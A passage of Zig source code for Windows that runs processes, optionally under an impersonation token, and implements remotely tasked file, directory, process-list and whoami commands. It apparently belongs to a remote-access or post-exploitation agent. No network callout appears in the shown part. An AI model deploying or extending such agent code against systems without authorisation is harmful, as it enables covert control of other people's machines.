            u8,
            if (used_primary_token) "Failed to create process with impersonation token" else "CreateProcessW failed",
        );
    }

    var output: std.ArrayList(u8) = .empty;
    defer output.deinit(allocator);
    var buffer: [4096]u8 = undefined;
    var process_done = false;
    const started = win.GetTickCount64();

    while (true) {
        var available: win.DWORD = 0;
        if (win.PeekNamedPipe(read_pipe, null, 0, null, &available, null).toBool()) {
            if (available > 0) {
                const to_read: win.DWORD = @min(available, buffer.len);
                var read: win.DWORD = 0;
                if (win.ReadFile(read_pipe, &buffer, to_read, &read, null).toBool() and read > 0) {
                    try output.appendSlice(allocator, buffer[0..read]);
                    continue;
                }
                break;
            }
        } else {
            break;
        }

        if (process_done) break;

        const wait_result = win.WaitForSingleObject(process_info.hProcess, 50);
        if (wait_result == win.WAIT_OBJECT_0) {
            process_done = true;
        } else if (wait_result == win.WAIT_FAILED) {
            break;
        }

        if (win.GetTickCount64() - started > 120_000) {
            _ = win.TerminateProcess(process_info.hProcess, 0);
            break;
        }
    }

    _ = win.CloseHandle(read_pipe);
    _ = win.WaitForSingleObject(process_info.hProcess, 5_000);
    _ = win.CloseHandle(process_info.hThread);
    _ = win.CloseHandle(process_info.hProcess);

    return output.toOwnedSlice(allocator);
}

pub fn nx_pwd(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    _ = params;
    return sysinfo.nx_current_dir(allocator);
}

pub fn nx_cd(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const path = nx_param_string(allocator, params, "path", "");
    if (path.len == 0) return allocator.dupe(u8, "No path specified");
    if (try sysinfo.nx_set_current_dir(allocator, path)) {
        return std.fmt.allocPrint(allocator, "Changed to {s}", .{path});
    }
    return allocator.dupe(u8, "Failed to change directory");
}

pub fn nx_ls(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const path = nx_param_string(allocator, params, "path", ".");
    const wide_pattern = try nx_wide_path_with_wildcard(allocator, path);
    var data: win.WIN32_FIND_DATAW = undefined;
    const find = win.FindFirstFileW(wide_pattern.ptr, &data);
    if (find == win.INVALID_HANDLE_VALUE)
        return allocator.dupe(u8, "Directory not found or empty");
    defer _ = win.FindClose(find);

    var out: std.ArrayList(u8) = .empty;
    errdefer out.deinit(allocator);
    while (true) {
        const name_w = std.mem.sliceTo(data.cFileName[0..], 0);
        const name = std.unicode.utf16LeToUtf8Alloc(allocator, name_w) catch "";
        const is_dir = (data.dwFileAttributes & win.FILE_ATTRIBUTE_DIRECTORY) != 0;
        const size = (@as(u64, data.nFileSizeHigh) << 32) | data.nFileSizeLow;
        if (is_dir) {
            try nx_append_fmt(allocator, &out, "d {s}\n", .{name});
        } else {
            try nx_append_fmt(allocator, &out, "- {s} ({d})\n", .{ name, size });
        }
        if (!win.FindNextFileW(find, &data).toBool()) break;
    }
    return out.toOwnedSlice(allocator);
}

pub fn nx_copy(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const source = nx_param_string(allocator, params, "source", "");
    const destination = nx_param_string(allocator, params, "destination", "");
    if (source.len == 0 or destination.len == 0)
        return allocator.dupe(u8, "source and destination required");
    const wide_source = try nx_wide_z(allocator, source);
    const wide_destination = try nx_wide_z(allocator, destination);
    if (win.CopyFileW(wide_source.ptr, wide_destination.ptr, win.BOOL.FALSE).toBool())
        return allocator.dupe(u8, "Copied");
    return allocator.dupe(u8, "Copy failed");
}

pub fn nx_move(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const source = nx_param_string(allocator, params, "source", "");
    const destination = nx_param_string(allocator, params, "destination", "");
    if (source.len == 0 or destination.len == 0)
        return allocator.dupe(u8, "source and destination required");
    const wide_source = try nx_wide_z(allocator, source);
    const wide_destination = try nx_wide_z(allocator, destination);
    if (win.MoveFileW(wide_source.ptr, wide_destination.ptr).toBool())
        return allocator.dupe(u8, "Moved");
    return allocator.dupe(u8, "Move failed");
}

pub fn nx_remove(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const path = nx_param_string(allocator, params, "path", "");
    if (path.len == 0) return allocator.dupe(u8, "No path specified");
    const wide = try nx_wide_z(allocator, path);
    if (win.DeleteFileW(wide.ptr).toBool()) return allocator.dupe(u8, "Deleted");
    return allocator.dupe(u8, "Delete failed");
}

pub fn nx_make_dir(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const path = nx_param_string(allocator, params, "path", "");
    if (path.len == 0) return allocator.dupe(u8, "No path specified");
    const wide = try nx_wide_z(allocator, path);
    if (win.CreateDirectoryW(wide.ptr, null).toBool()) return allocator.dupe(u8, "Created");
    return allocator.dupe(u8, "mkdir failed");
}

pub fn nx_cat(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const path = nx_param_string(allocator, params, "path", "");
    if (path.len == 0) return allocator.dupe(u8, "No path specified");
    const wide = try nx_wide_z(allocator, path);
    const handle = win.CreateFileW(
        wide.ptr,
        win.GENERIC_READ,
        win.FILE_SHARE_READ,
        null,
        win.OPEN_EXISTING,
        win.FILE_ATTRIBUTE_NORMAL,
        null,
    );
    if (handle == win.INVALID_HANDLE_VALUE)
        return allocator.dupe(u8, "Failed to open file");
    defer _ = win.CloseHandle(handle);

    var size: i64 = 0;
    if (!win.GetFileSizeEx(handle, &size).toBool())
        return allocator.dupe(u8, "Failed to get file size");
    if (size < 0 or size > 1024 * 1024)
        return allocator.dupe(u8, "File too large (>1MB)");

    const buffer = try allocator.alloc(u8, @intCast(size));
    var read: win.DWORD = 0;
    if (size > 0 and !win.ReadFile(handle, buffer.ptr, @intCast(size), &read, null).toBool())
        return allocator.dupe(u8, "Failed to read file");
    return buffer[0..read];
}

pub fn nx_whoami(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    _ = params;
    const host = try sysinfo.nx_hostname(allocator);
    const user = try sysinfo.nx_username(allocator);
    return std.fmt.allocPrint(allocator, "{s}\\{s}", .{ host, user });
}

pub fn nx_ps(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    _ = params;
    const snapshot = win.CreateToolhelp32Snapshot(win.TH32CS_SNAPPROCESS, 0);
    if (snapshot == win.INVALID_HANDLE_VALUE)
        return allocator.dupe(u8, "Snapshot failed");
    defer _ = win.CloseHandle(snapshot);

    var entry: win.PROCESSENTRY32W = std.mem.zeroes(win.PROCESSENTRY32W);
    entry.dwSize = @sizeOf(win.PROCESSENTRY32W);
    var out: std.ArrayList(u8) = .empty;
    errdefer out.deinit(allocator);
    if (win.Process32FirstW(snapshot, &entry).toBool()) {
        while (true) {
            const name_w = std.mem.sliceTo(entry.szExeFile[0..], 0);
            const name = std.unicode.utf16LeToUtf8Alloc(allocator, name_w) catch "";
            try nx_append_fmt(allocator, &out, "{d}\t{s}\n", .{ entry.th32ProcessID, name });
            if (!win.Process32NextW(snapshot, &entry).toBool()) break;
        }
    }
    return out.toOwnedSlice(allocator);
}
